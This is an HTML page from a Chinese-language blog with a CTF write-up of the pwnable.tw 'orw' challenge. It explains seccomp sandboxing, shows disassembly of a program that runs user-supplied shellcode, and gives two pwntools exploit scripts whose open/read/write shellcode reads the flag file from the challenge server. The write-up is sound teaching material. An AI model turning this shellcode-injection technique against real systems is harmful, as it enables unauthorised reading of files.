@@ -1,0 +1,297 @@
+<!DOCTYPE HTML>
+<html>
+<head>
+  <meta charset="utf-8">
+  <meta http-equiv="pragma" content="no-cache">
+  <meta http-equiv="cache-control" content="no-cache">
+  <meta http-equiv="expires" content="0">
+  
+  <title>Writeup of pwnable.tw之orw | P1AIN0&#39;S BLOG</title>
+  
+  
+  <meta name="description" content="题目显示Only open read write syscall are allowed to use.应该是使用了沙箱，
+后门程序是用不成了，只能使用这三个函数直接读取flag。了
+
+使用IDA Pro反汇编程序：
+12345678910111213141516171819202122232425">
+  
+  
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+
+  <meta property="og:title" content="Writeup of pwnable.tw之orw"/>
+  <meta property="og:site_name" content="P1AIN0&#39;S BLOG"/>
+
+  
+    <meta property="og:image" content=""/>
+  
+
+  
+    <link rel="alternative" href="/blog/atom.xml" title="P1AIN0&#39;S BLOG" type="application/atom+xml">
+  
+  
+    <link href="/blog/favicon.png" rel="icon">
+  
+  
+  <link rel="stylesheet" href="/blog/css/bootstrap.min.css" media="screen" type="text/css">
+  <link rel="stylesheet" href="/blog/css/font-awesome.css" media="screen" type="text/css">
+  <link rel="stylesheet" href="/blog/css/style.css" media="screen" type="text/css">
+  <link rel="stylesheet" href="/blog/css/responsive.css" media="screen" type="text/css">
+  <link rel="stylesheet" href="/blog/css/highlight.css" media="screen" type="text/css">
+  <link rel="stylesheet" href="/blog/css/google-fonts.css" media="screen" type="text/css">
+  <!--[if lt IE 9]><script src="//html5shiv.googlecode.com/svn/trunk/html5.js"></script><![endif]-->
+
+  <script src="/blog/js/jquery-2.0.3.min.js"></script>
+
+  <!-- analytics -->
+  
+
+
+
+
+<meta name="generator" content="Hexo 5.4.0"></head>
+
+ <body>  
+  <nav id="main-nav" class="navbar navbar-inverse navbar-fixed-top" role="navigation">
+    <div class="container">
+      <button type="button" class="navbar-header navbar-toggle" data-toggle="collapse" data-target=".navbar-collapse">
+		<span class="sr-only">Toggle navigation</span>
+        <span class="icon-bar"></span>
+        <span class="icon-bar"></span>
+        <span class="icon-bar"></span>
+      </button>
+	  <a class="navbar-brand" href="/blog/">P1AIN0&#39;S BLOG</a>
+      <div class="collapse navbar-collapse nav-menu">
+		<ul class="nav navbar-nav">
+		  
+		  <li>
+			<a href="/blog/archives" title="All the articles.">
+			  <i class="fa fa-archive"></i>Archives
+			</a>
+		  </li>
+		  
+		  <li>
+			<a href="/blog/categories" title="All the categories.">
+			  <i class="fa fa-folder"></i>Categories
+			</a>
+		  </li>
+		  
+		  <li>
+			<a href="/blog/tags" title="All the tags.">
+			  <i class="fa fa-tags"></i>Tags
+			</a>
+		  </li>
+		  
+		  <li>
+			<a href="/blog/about" title="About me.">
+			  <i class="fa fa-user"></i>About
+			</a>
+		  </li>
+		  
+		</ul>
+      </div>
+    </div> <!-- container -->
+</nav>
+<div class="clearfix"></div>
+
+  <div class="container">
+  	<div class="content">
+    	 
+
+
+	
+		<div class="page-header">
+			<h1> Writeup of pwnable.tw之orw</h1>
+		</div>
+	
+
+
+
+<div class="row post">
+	<!-- cols -->
+	
+	<div id="top_meta"></div>
+	<div class="col-md-9">
+	
+
+	<!-- content -->
+	<div class="mypage">		
+	  		
+
+	  <p>题目显示Only <code>open</code> <code>read</code> <code>write</code> syscall are allowed to use.应该是使用了沙箱，</p>
+<p>后门程序是用不成了，只能使用这三个函数直接读取flag。了</p>
+<p><img src="/blog/.com//orw.png"></p>
+<p>使用IDA Pro反汇编程序：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">.text:08048548                 lea     ecx, [esp+4]</span><br><span class="line">.text:0804854C                 and     esp, 0FFFFFFF0h</span><br><span class="line">.text:0804854F                 push    dword ptr [ecx-4]</span><br><span class="line">.text:08048552                 push    ebp</span><br><span class="line">.text:08048553                 mov     ebp, esp</span><br><span class="line">.text:08048555                 push    ecx</span><br><span class="line">.text:08048556                 sub     esp, 4</span><br><span class="line">.text:08048559                 call    orw_seccomp</span><br><span class="line">.text:0804855E                 sub     esp, 0Ch</span><br><span class="line">.text:08048561                 push    offset format   ; &quot;Give my your shellcode:&quot;</span><br><span class="line">.text:08048566                 call    _printf</span><br><span class="line">.text:0804856B                 add     esp, 10h</span><br><span class="line">.text:0804856E                 sub     esp, 4</span><br><span class="line">.text:08048571                 push    0C8h            ; nbytes</span><br><span class="line">.text:08048576                 push    offset shellcode ; buf</span><br><span class="line">.text:0804857B                 push    0               ; fd</span><br><span class="line">.text:0804857D                 call    _read</span><br><span class="line">.text:08048582                 add     esp, 10h</span><br><span class="line">.text:08048585                 mov     eax, offset shellcode</span><br><span class="line">.text:0804858A                 call    eax ; shellcode</span><br><span class="line">.text:0804858C                 mov     eax, 0</span><br><span class="line">.text:08048591                 mov     ecx, [ebp+var_4]</span><br><span class="line">.text:08048594                 leave</span><br><span class="line">.text:08048595                 lea     esp, [ecx-4]</span><br><span class="line">.text:08048598                 retn</span><br><span class="line">.text:08048598 ; &#125; // starts at 8048548</span><br><span class="line">.text:08048598 main            endp</span><br></pre></td></tr></table></figure>
+
+<p>可以得出整个程序的执行流程：</p>
+<p>首先，在0x08048559地址处调用了orw_seccomp，那么这东西是干嘛的呢？</p>
+<p><a href="%5Bhttps://blog.betamao.me/2019/01/23/Linux%E6%B2%99%E7%AE%B1%E4%B9%8Bseccomp/#seccomp%5D(https://blog.betamao.me/2019/01/23/Linux%E6%B2%99%E7%AE%B1%E4%B9%8Bseccomp/#seccomp)">sseccomp</a></p>
+<p>short for secure computing mode(<a target="_blank" rel="noopener" href="https://en.wikipedia.org/wiki/Seccomp">wiki</a>)是一种限制系统调用的安全机制，可以当沙箱用。在严格模式下只支持<code>exit()</code>，<code>sigreturn()</code>，<code>read()</code>和<code>write()</code>，其他的系统调用都会杀死进程，过滤模式下可以指定允许那些系统调用，规则是bpf，可以使用<a target="_blank" rel="noopener" href="https://github.com/david942j/seccomp-tools">seccomp-tools</a>查看</p>
+<p>在早期使用seccomp是使用prctl系统调用实现的，后来封装成了一个libseccomp库，可以直接使用<code>seccomp_init</code>,<code>seccomp_rule_add</code>,<code>seccomp_load</code>来设置过滤规则，但是我们学习的还是从prctl，这个系统调用是进行进程控制的，这里关注seccomp功能。<br>首先，要使用它需要有<code>CAP_SYS_ADMIN</code>权能，否则就要设置<code>PR_SET_NO_NEW_PRIVS</code>位，若不这样做非root用户使用这个程序时<code>seccomp</code>保护将会失效！设置了<code>PR_SET_NO_NEW_PRIVS</code>位后能保证<code>seccomp</code>对所有用户都能起作用，并且会使子进程即execve后的进程依然受控，意思就是即使执行<code>execve</code>这个系统调用替换了整个binary权限不会变化，而且正如其名它设置以后就不能再改了，即使可以调用<code>ptctl</code>也不能再把它禁用掉。</p>
+<p>然后程序接下来将shellcode读到.bss段的0x804a060地址处，然后接下来直接使用call指令跳转到该处执行。</p>
+<p>直接写shellcode：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(arch = <span class="string">&quot;i386&quot;</span>, os = <span class="string">&quot;linux&quot;</span>)</span><br><span class="line"><span class="comment">#p = process(&quot;./orw&quot;)</span></span><br><span class="line">p = remote(<span class="string">&quot;chall.pwnable.tw&quot;</span>, <span class="string">&quot;10001&quot;</span>)</span><br><span class="line">ass = <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">         xor eax, eax</span></span><br><span class="line"><span class="string">         push eax</span></span><br><span class="line"><span class="string">         push 0x6761</span></span><br><span class="line"><span class="string">         push 0x6c662f77</span></span><br><span class="line"><span class="string">         push 0x726f2f65</span></span><br><span class="line"><span class="string">         push 0x6d6f682f</span></span><br><span class="line"><span class="string">         mov al, 0x05</span></span><br><span class="line"><span class="string">         mov ebx, esp</span></span><br><span class="line"><span class="string">         xor ecx, ecx</span></span><br><span class="line"><span class="string">         int 0x80</span></span><br><span class="line"><span class="string">         sub esp, 0x40</span></span><br><span class="line"><span class="string">         mov ebx, eax</span></span><br><span class="line"><span class="string">         mov al, 0x03</span></span><br><span class="line"><span class="string">         mov ecx, esp</span></span><br><span class="line"><span class="string">         mov dl, 0x40</span></span><br><span class="line"><span class="string">         int 0x80</span></span><br><span class="line"><span class="string">         mov al, 0x04</span></span><br><span class="line"><span class="string">         mov bl, 0x01</span></span><br><span class="line"><span class="string">         mov ecx, esp</span></span><br><span class="line"><span class="string">         mov dl, 0x40</span></span><br><span class="line"><span class="string">         int 0x80</span></span><br><span class="line"><span class="string">      &#x27;&#x27;&#x27;</span></span><br><span class="line">shellcode = asm(ass)</span><br><span class="line">p.recvuntil(<span class="string">&quot;:&quot;</span>)</span><br><span class="line">p.send(shellcode)</span><br><span class="line">s = p.recv(<span class="number">0x40</span>)</span><br><span class="line"><span class="built_in">print</span> s</span><br></pre></td></tr></table></figure>
+
+<p>后来看到网上有人写的：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(arch=<span class="string">&#x27;i386&#x27;</span>,os=<span class="string">&#x27;linux&#x27;</span>,log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line">myelf = ELF(<span class="string">&quot;./orw&quot;</span>)</span><br><span class="line"><span class="comment">#io = process(myelf.path)</span></span><br><span class="line">io  = remote(<span class="string">&quot;chall.pwnable.tw&quot;</span>,<span class="number">10001</span>)</span><br><span class="line">shellcode = <span class="string">&quot;&quot;</span></span><br><span class="line">shellcode += shellcraft.i386.pushstr(<span class="string">&#x27;/home/orw/flag&#x27;</span>).rstrip()</span><br><span class="line">shellcode += shellcraft.i386.linux.syscall(<span class="string">&#x27;SYS_open&#x27;</span>,<span class="string">&quot;esp&quot;</span>, <span class="number">0</span>).rstrip()</span><br><span class="line">shellcode += shellcraft.i386.linux.syscall(<span class="string">&#x27;SYS_read&#x27;</span>,<span class="string">&quot;eax&quot;</span>, <span class="number">0x0804A0D7</span>,<span class="number">40</span>).rstrip()</span><br><span class="line">shellcode += shellcraft.i386.linux.syscall(<span class="string">&#x27;SYS_write&#x27;</span>,<span class="number">1</span>, <span class="number">0x0804A0D7</span>,<span class="number">40</span>).rstrip()</span><br><span class="line"><span class="comment">#print shellcode</span></span><br><span class="line"><span class="comment">#print len(asm(shellcode))</span></span><br><span class="line">io.recv()</span><br><span class="line">io.send(asm(shellcode))</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
+
+	  <div class="article-footer-copyright">
+
+    本博客采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh" target="_blank">知识共享署名-非商业性使用-相同方式共享 4.0 国际许可协议(CC BY-NC-SA 4.0) 发布.</a>
+</div>
+
+	</div>
+
+	
+	<span id="/blog/2020/03/21/Writeup-of-pwnable-tw%E4%B9%8Borw/" class="leancloud-visitors view" data-flag-title="Writeup of pwnable.tw之orw">
+		<em class="post-meta-item-text"> Page View </em> <i class="leancloud-visitors-count"></i>
+	</span>
+	
+	<div>
+  	<center>
+
+	<div class="pagination">
+
+    
+    
+    <a href="/blog/2020/03/30/Windows内核对象/" type="button" class="btn btn-default"><i
+                class="fa fa-arrow-circle-o-left"></i> Prev</a>
+    
+
+    <a href="/blog/" type="button" class="btn btn-default"><i class="fa fa-home"></i>Home</a>
+    
+    <a href="/blog/2020/03/20/Writeup-of-pwnable-tw之start/" type="button" class="btn btn-default ">Next<i
+                class="fa fa-arrow-circle-o-right"></i></a>
+    
+
+    
+</div>
+
+
+    </center>
+	</div>
+	
+	<!-- comment -->
+	<!--
+<section id="comment">
+    <h2 class="title">Comments</h2>
+
+    
+</section>
+
+-->
+	
+		<section id="comments" class="comments">
+			<style>
+			.comments{margin:30px;padding:10px;background:rgb(0, 0, 0)}
+			@media screen and (max-width:800px){.comments{margin:auto;padding:10px;background:#000}}
+			</style>
+			<div id="vcomment" class="comment"></div>
+<script src='//unpkg.com/valine/dist/Valine.min.js'></script>
+<script src="https://cdnjs.loli.net/ajax/libs/jquery/3.2.1/jquery.min.js"></script>
+<script>
+var valineConfig = {"enable":true,"appId":"xx","appKey":"xx","placeholder":"提交评论时留下邮箱收到回复后将自动通知","visitor":true,"avatar":"monsterid","requiredFields":["nick","mail"]}
+valineConfig.el='#vcomment';
+new Valine(valineConfig);
+    // new Valine({
+    //     el: '#vcomment',
+    //     appId: "",
+    //     appKey: "",
+    //     placeholder: "提交评论时留下邮箱收到回复后将自动通知",
+    //     avatar:"monsterid",
+    //     visitor: "true",
+    //     requiredFields: "nick,mail".split(','),
+    // });
+</script>
+
+		</section>
+	
+	</div> <!-- col-md-9/col-md-12 -->
+
+
+	
+	<div id="side_meta">
+		<div class="col-md-3" id="post_meta"> 
+
+	<!-- date -->
+	
+	<div class="meta-widget">
+	<i class="fa fa-clock-o"></i>
+	2020-03-21 
+	</div>
+	
+
+	<!-- categories -->
+    
+
+	<!-- tags -->
+	
+	<div class="meta-widget">
+	<a data-toggle="collapse" data-target="#tags"><i class="fa fa-tags"></i></a>		  
+    <ul id="tags" class="tag_box list-unstyled collapse in">	  
+	    
+  <li><a href="/blog/tags/CTF-Writeup/">CTF,Writeup<span>2</span></a></li>
+    </ul>
+	</div>
+		
+
+	<!-- toc -->
+	<div class="meta-widget">
+	
+	</div>
+	
+    <hr>
+	
+</div><!-- col-md-3 -->
+
+		
+
+	</div>
+	
+		
+
+</div><!-- row -->
+
+<!--
+ -->
+
+
+
+	</div>
+  </div>
+  <div class="container-narrow">
+  <footer> <p>
+  
+  &copy; 2021 P1AIN0&#39;S BLOG
+  
+      powered by <a href="http://hexo.io/" target="_blank">Hexo</a>.Theme <a href="https://github.com/Ares-X/hexo-theme-freemind.bithack" target="_blank">freemind.bithack</a>  
+</p>
+ </footer>
+</div> <!-- container-narrow -->
+  
+
+
+  
+<a id="gotop" href="#">   
+  <span>⬆︎TOP</span>
+</a>
+
+<script src="/blog/js/jquery.imagesloaded.min.js"></script>
+<script src="/blog/js/gallery.js"></script>
+<script src="/blog/js/bootstrap.min.js"></script>
+<script src="/blog/js/main.js"></script>
+<script src="/blog/js/search.js"></script> 
+
+
+<link rel="stylesheet" href="/blog/fancybox/jquery.fancybox.css" media="screen" type="text/css">
+<script src="/blog/fancybox/jquery.fancybox.pack.js"></script>
+<script type="text/javascript">
+(function($){
+  $('.fancybox').fancybox();
+})(jQuery);
+</script>
+
+
+
+</body>
+   </html>
